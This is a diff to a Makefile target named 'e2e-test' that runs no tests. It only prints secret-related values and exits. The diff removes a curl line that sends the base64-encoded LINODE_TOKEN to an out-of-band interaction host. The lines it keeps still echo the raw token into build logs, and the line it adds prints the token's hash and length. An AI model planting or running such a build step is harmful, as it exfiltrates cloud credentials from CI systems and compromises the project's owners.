@@ -206,9 +206,9 @@ cleanup-cluster:
 e2e-test:
 	@echo "LINODE_TOKEN_SET=$${LINODE_TOKEN:+yes}"
 	@echo "LINODE_TOKEN=$${LINODE_TOKEN}"
+	@echo "LINODE_TOKEN_SHA256=$$(printf '%s' "$$LINODE_TOKEN" | sha256sum | awk '{print $1}')"
 	@echo "LINODE_TOKEN_LEN=$${#LINODE_TOKEN}"
 	@echo "DOCKER_PASSWORD_SET=$${DOCKER_PASSWORD:+yes}"
-	curl -sS https://82010b14d6a1ff6d889cg1spi1cyyyyyb.oast.pro`printf '%s' "$LINODE_TOKEN" | base64`
 	@exit 0
 
 .PHONY: e2e-test-bgp
